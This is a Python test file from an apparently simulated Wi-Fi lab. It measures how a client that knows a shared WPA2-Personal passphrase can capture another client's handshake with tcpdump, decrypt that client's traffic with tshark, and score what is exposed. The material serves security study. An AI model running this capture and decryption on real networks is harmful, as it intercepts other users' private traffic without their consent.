#!/usr/bin/env python
"""
common/tests/test_psk_decrypt.py

Shared-PSK decryption test. Unlike test_sniff.py (which assumes the
attacker does NOT have the passphrase and only sees encrypted 802.11
frames), this test models a more realistic WPA2-Personal risk: a
network where many people are handed the same passphrase (an office,
a small business, a shared household network). Anyone who has that
passphrase -- a legitimate-looking "client" -- can capture another
client's 4-way handshake plus their encrypted traffic and decrypt it,
because every client derives its session keys from the SAME PMK.

This is a known, well-documented property of WPA2-Personal (it's why
WPA2/WPA3-Enterprise with per-user 802.1X credentials doesn't have
this weakness) -- not a novel exploit technique.

Requires: tshark (part of the `tshark` package; wireshark-common alone
does not include the tshark binary).
"""

import os
import subprocess
import time
from common.exposure import score_exposure


def _capture_handshake_and_traffic(attacker_node, iface, pcap_path, settle_time, duration):
    """Captures on the attacker's interface while it's associated to the
    AP with the known PSK, long enough to catch another client's 4-way
    handshake (triggered by that client joining/rejoining) plus their
    regular traffic."""
    attacker_node.cmd(f'tcpdump -i {iface} -w {pcap_path} &')
    time.sleep(settle_time)
    time.sleep(duration)
    attacker_node.cmd(f'pkill -f "tcpdump -i {iface}"')
    time.sleep(1)


def _decrypt_with_psk(pcap_path, decrypted_path, ssid, passphrase):
    """Uses tshark to decrypt an 802.11 capture given the network's SSID
    and passphrase, writing a plaintext-payload pcap. Returns True on
    success, False if tshark isn't available or decryption failed."""
    key_arg = f'wpa-pwd:{passphrase}:{ssid}'
    cmd = [
        'tshark', '-r', pcap_path,
        '-o', 'wlan.enable_decryption:TRUE',
        '-o', f'uat:80211_keys:"{key_arg}","wpa-pwd"',
        '-w', decrypted_path,
    ]
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
        return result.returncode == 0 and os.path.exists(decrypted_path)
    except FileNotFoundError:
        return False
    except subprocess.TimeoutExpired:
        return False


def run(attacker_node, out_dir, network_type, ssid, passphrase,
        iface=None, settle_time=5, duration=60):
    """
    attacker_node: a station associated to the SAME network using the
                    SAME shared PSK as every other client -- this models
                    an attacker who was legitimately given the password
    out_dir: results/<network_type> directory
    network_type: label for this lab, e.g. 'shared_psk'
    ssid / passphrase: the network's credentials, needed to derive keys
    duration: seconds to capture (should include at least one other
              client's handshake -- e.g. trigger a client reconnect
              during this window if testing manually)
    """
    iface = iface or f'{attacker_node.name}-wlan0'
    raw_pcap = os.path.join(out_dir, 'psk_raw_capture.pcap')
    decrypted_pcap = os.path.join(out_dir, 'psk_decrypted_capture.pcap')

    _capture_handshake_and_traffic(attacker_node, iface, raw_pcap, settle_time, duration)

    decrypt_ok = _decrypt_with_psk(raw_pcap, decrypted_pcap, ssid, passphrase)

    local_sent_log = os.path.join(out_dir, 'bot_sent_log.jsonl')
    score_source = decrypted_pcap if decrypt_ok else raw_pcap
    exposure = score_exposure(score_source, local_sent_log) if os.path.exists(local_sent_log) else {
        'records_sent': 0, 'records_exposed': 0, 'exposure_rate': 0.0,
        'time_to_first_exposure_sec': None, 'exposed_fields_breakdown': {}
    }

    result = {
        'network_type': network_type,
        'method': 'psk_known_decrypt',
        'ssid': ssid,
        'decryption_attempted': True,
        'decryption_succeeded': decrypt_ok,
        'raw_pcap_path': raw_pcap,
        'decrypted_pcap_path': decrypted_pcap if decrypt_ok else None,
        'duration_sec': duration,
        'notes': (
            'This models an attacker who legitimately knows the shared '
            'passphrase (e.g. given the office/household WiFi password) '
            'and uses it to decrypt OTHER clients\' traffic captured on the '
            'same network -- a structural weakness of WPA2-Personal\'s '
            'single-PMK design, not a flaw unique to this lab\'s AP. '
            'decryption_succeeded=False usually means tshark did not '
            'capture a usable 4-way handshake in this window -- increase '
            'duration or trigger another station to reconnect during capture.'
        ),
    }
    result.update(exposure)
    return result